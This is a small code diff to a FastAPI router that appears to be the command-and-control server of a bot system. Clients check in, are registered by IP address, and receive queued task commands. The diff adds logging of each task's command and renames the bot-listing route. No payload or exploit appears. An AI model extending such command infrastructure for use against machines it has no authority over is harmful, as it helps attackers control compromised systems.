@@ -20,16 +20,18 @@ def check_in(
         task = bot.task
         if not task:
             raise HTTPException(status_code=404, detail="Task not found")
+        print(f"Bot {bot.id} checked in with task: {task.command}")
         return task
     else:
         ip = request.client.host
         bot = Bot(id=telem.id, name=ip)
         bot = repo.create_bot(bot)
         task = bot.task
+        print(f"New bot {bot.id} created with task: {task.command}")
         return task
 
 
-@router.get("/", response_model=List[Bot])
+@router.get("/bots", response_model=List[Bot])
 def get_all_bots(repo: BotRepository = Depends()):
     bots = repo.get_all_bots()
     return bots
